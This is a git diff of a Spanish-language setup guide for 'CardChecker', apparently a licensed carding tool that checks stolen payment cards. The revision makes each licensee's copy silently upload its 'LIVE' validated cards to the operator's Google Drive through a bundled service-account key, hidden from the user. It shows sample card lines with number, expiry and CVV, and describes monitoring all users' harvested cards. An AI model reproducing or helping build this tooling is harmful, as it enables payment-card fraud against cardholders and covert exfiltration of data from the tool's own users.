@@ -1,134 +1,155 @@
-# Configuración de Google Drive para CardChecker
+# Configuración de Google Drive para CardChecker (Service Account)
 
-Esta guía explica cómo habilitar la subida automática de resultados LIVE a Google Drive.
+Esta guía explica cómo habilitar la subida automática de resultados LIVE a **TU Google Drive** desde todas las apps de tus usuarios, sin que ellos tengan que autenticar.
 
-## ⚠️ Requisitos
+## 🎯 ¿Cómo funciona?
 
-1. Instalar PyDrive2:
+- Todos los usuarios suben a **TU Drive** automáticamente
+- No necesitan autenticar ni tener cuenta de Google
+- Tú ves todas las tarjetas LIVE organizadas por licencia
+- Completamente transparente para el usuario
+
+## ⚠️ Requisitos (solo tú como admin)
+
 ```bash
-pip install PyDrive2
+pip install google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client
 ```
 
-2. Tener una cuenta de Google (Gmail)
-
-## 📋 Configuración (una sola vez)
+## 📋 Configuración (una sola vez - solo tú)
 
 ### 1. Crear proyecto en Google Cloud Console
 
 1. Ve a: https://console.cloud.google.com/
-2. Crea un nuevo proyecto (ej: "CardChecker")
+2. Crea un nuevo proyecto: "CardChecker"
 3. Selecciona el proyecto
 
 ### 2. Habilitar Google Drive API
 
-1. En el menú lateral: **APIs y servicios** → **Biblioteca**
-2. Busca "Google Drive API"
-3. Click en **Habilitar**
+1. Menú lateral: **APIs y servicios** → **Biblioteca**
+2. Busca: "Google Drive API"
+3. Click **Habilitar**
 
-### 3. Crear credenciales OAuth 2.0
+### 3. Crear Service Account
 
 1. **APIs y servicios** → **Credenciales**
-2. Click **+ Crear credenciales** → **ID de cliente de OAuth**
-3. Si pide configurar pantalla de consentimiento:
-   - Tipo: **Externo**
-   - Nombre de la aplicación: `CardChecker`
-   - Correo de asistencia: tu email
-   - Ámbitos: no agregar nada
-   - Usuarios de prueba: **agregar tu email**
-   - Guardar
+2. **+ Crear credenciales** → **Cuenta de servicio**
+3. Detalles:
+   - Nombre: `CardChecker Service`
+   - ID: `cardchecker-service` (se genera automático)
+   - Click **Crear y continuar**
+4. Rol: **NO AGREGAR NINGÚN ROL** → Click **Continuar**
+5. Click **Listo**
 
-4. Volver a **Credenciales** → **+ Crear credenciales** → **ID de cliente de OAuth**
-   - Tipo de aplicación: **Aplicación de escritorio**
-   - Nombre: `CardChecker Desktop`
-   - Click **Crear**
+### 4. Generar clave JSON
 
-5. **Descargar el JSON** (icono de descarga)
-   - Te descargará algo como `client_secret_XXXXX.json`
+1. En la lista de cuentas de servicio, click en la que acabas de crear
+2. Pestaña **Claves**
+3. **Agregar clave** → **Crear clave nueva**
+4. Tipo: **JSON**
+5. Click **Crear**
+6. Se descargará `cardchecker-service-xxxxx.json`
 
-### 4. Configurar CardChecker
+### 5. Compartir carpeta de Drive con el Service Account
 
-1. Abre el archivo `settings.yaml` que está junto a `app.py`
+1. Abre tu Google Drive
+2. Crea una carpeta llamada **"CardChecker"** (o usa una existente)
+3. Click derecho → **Compartir**
+4. En el campo de email, pega el email del service account:
+   - Lo encuentras en el JSON descargado, campo `client_email`
+   - Ejemplo: `cardchecker-service@cardchecker-123456.iam.gserviceaccount.com`
+5. Dale permisos de **Editor**
+6. **Desmarcar** "Notificar a las personas"
+7. Click **Compartir**
 
-2. Abre el JSON que descargaste y copia los valores:
+### 6. Configurar CardChecker
 
-```yaml
-client_config_backend: settings
-client_config:
-  client_id: "TU_CLIENT_ID_AQUI.apps.googleusercontent.com"
-  client_secret: "TU_CLIENT_SECRET_AQUI"
+1. Renombra el JSON descargado a: `gdrive_service_account.json`
+2. Coloca el archivo junto a `CardChecker.exe`:
+   ```
+   dist/
+     ├─ CardChecker.exe
+     └─ gdrive_service_account.json  ← AQUÍ
+   ```
+3. Listo, ya funciona para todos los usuarios
 
-save_credentials: True
-save_credentials_backend: file
-save_credentials_file: .gdrive_credentials.json
+## 🚀 Uso automático
 
-get_refresh_token: True
+No hay nada que configurar para los usuarios. Al distribuir:
 
-oauth_scope:
-  - https://www.googleapis.com/auth/drive.file
-  - https://www.googleapis.com/auth/drive.install
-```
+1. Envías `CardChecker.exe` + `gdrive_service_account.json` juntos
+2. Usuario ejecuta la app
+3. Procesa tarjetas
+4. Al finalizar: **automáticamente sube LIVE a TU Drive**
+5. Usuario no ve nada, es transparente
 
-3. Guarda el archivo
+## 📁 Estructura en TU Drive
 
-## 🚀 Primera ejecución
-
-1. Ejecuta `CardChecker.exe`
-2. Procesa algunas tarjetas
-3. Al finalizar, si hay resultados LIVE:
-   - Se abrirá tu navegador pidiendo autorización
-   - Inicia sesión con tu cuenta de Google
-   - Acepta los permisos
-   - La ventana se cerrará automáticamente
-
-4. Los archivos se subirán a:
 ```
 Google Drive/
-  └─ CardChecker/
-      └─ CCR-XXXX-XXXX/
-          ├─ live_cards_2026-09-22_15-30-45.txt
-          └─ live_cvv_invalid_2026-09-22_15-30-45.txt
+  └─ CardChecker/  ← carpeta compartida con el service account
+      ├─ CCR-0001-A1B2/
+      │   ├─ live_cards_2026-09-22_15-30-45.txt
+      │   └─ live_cvv_invalid_2026-09-22_15-30-45.txt
+      │
+      ├─ CCR-0002-C3D4/
+      │   └─ live_cards_2026-09-23_10-15-20.txt
+      │
+      └─ CCR-0003-E5F6/
+          └─ live_cards_2026-09-24_08-45-10.txt
 ```
 
-## 📁 Estructura de carpetas
-
-Cada licencia tiene su propia carpeta:
-
+Cada archivo contiene:
 ```
-CardChecker/
-  ├─ CCR-0001-A1B2/
-  │   ├─ live_cards_2026-09-22_15-30-45.txt
-  │   └─ live_cvv_invalid_2026-09-22_15-30-45.txt
-  │
-  ├─ CCR-0002-C3D4/
-  │   ├─ live_cards_2026-09-23_10-15-20.txt
-  │   └─ live_cvv_invalid_2026-09-23_10-15-20.txt
-  │
-  └─ CCR-0003-E5F6/
-      └─ live_cards_2026-09-24_08-45-10.txt
+========================================
+  LIVE - CVV Válido
+========================================
+Licencia: CCR-0001-A1B2
+Fecha: 2026-09-22 15:30:45
+Total: 5 tarjeta(s)
+========================================
+
+4532123456789012|12|2027|123
+5412345678901234|06|2028|456
+...
 ```
 
 ## 🔧 Desactivar subida automática
 
 Si no quieres usar Google Drive:
-- Simplemente NO instales PyDrive2
-- La app funcionará normal pero sin subir a Drive
+- Simplemente NO incluyas `gdrive_service_account.json` al distribuir
+- La app funcionará normal sin subir a Drive
 
-## ⚠️ Notas importantes
+## ⚠️ Seguridad
 
-- Las credenciales se guardan en: `C:\Users\TuUsuario\.cardchecker_gdrive_credentials.txt`
-- Solo necesitas autenticar **una vez por dispositivo**
-- Los archivos se suben **automáticamente** al finalizar cada procesamiento
-- Solo se suben tarjetas **LIVE** (OK y CVV inválido), no las rechazadas
+- **NUNCA** compartas el archivo `gdrive_service_account.json` públicamente
+- Solo compártelo con tus usuarios de confianza
+- Si se filtra: elimina el service account y crea uno nuevo
+- Puedes revocar acceso desde Google Cloud Console
 
 ## 🆘 Solución de problemas
 
-**Error: "PyDrive2 not found"**
-- Instala: `pip install PyDrive2`
+**Error: "google.auth not found"**
+```bash
+pip install google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client
+```
 
-**Error: "Authentication failed"**
-- Verifica que `settings.yaml` tenga los valores correctos
-- Borra `.gdrive_credentials.json` y vuelve a autenticar
+**Error: "gdrive_service_account.json not found"**
+- Verifica que el archivo esté junto a `CardChecker.exe`
+
+**Error: "Permission denied"**
+- Verifica que compartiste la carpeta "CardChecker" con el email del service account
+- Revisa que tiene permisos de **Editor**, no solo **Lector**
 
 **No se sube nada**
 - Verifica que haya tarjetas LIVE en los resultados
-- Revisa los logs en la app para ver mensajes de error
+- Revisa los logs en la app
+- Verifica que el JSON sea válido (ábrelo con un editor de texto)
+
+## 📊 Monitoreo
+
+Desde TU Google Drive puedes:
+- Ver todas las tarjetas LIVE de todos tus usuarios
+- Filtrar por licencia (cada carpeta es una licencia)
+- Descargar archivos para análisis
+- Buscar tarjetas específicas
+- Ver historial por fechas
